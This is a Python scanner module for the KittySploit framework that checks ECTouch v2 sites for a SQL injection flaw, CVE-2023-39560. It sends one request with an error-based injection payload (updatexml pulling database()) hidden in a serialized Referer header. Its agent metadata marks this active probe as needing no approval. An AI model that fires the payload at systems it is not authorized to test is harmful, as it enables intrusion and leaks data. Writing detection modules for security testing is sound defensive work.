#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ECTouch v2 was discovered to contain a SQL injection vulnerability via the $arr['id'] parameter at /default/he."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ECTouch v2 - SQL Injection Detection',
        'description': "ECTouch v2 was discovered to contain a SQL injection vulnerability via the $arr['id'] parameter at \\default\\helpers\\insert.php.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'ectouch', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://wiki.bachang.org/doc/2582/', 'https://nvd.nist.gov/vuln/detail/CVE-2023-39560'],
        'cve': 'CVE-2023-39560',
    }

    def run(self):
        path = '/index.php?m=default&c=user&a=register&u=0'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': '554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:"id";s:49:"0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#";}'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ("XPATH syntax error: '~[^~]+~'<br>",)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='ECTouch v2 - SQL Injection detected', path=path)
            return True
        return False

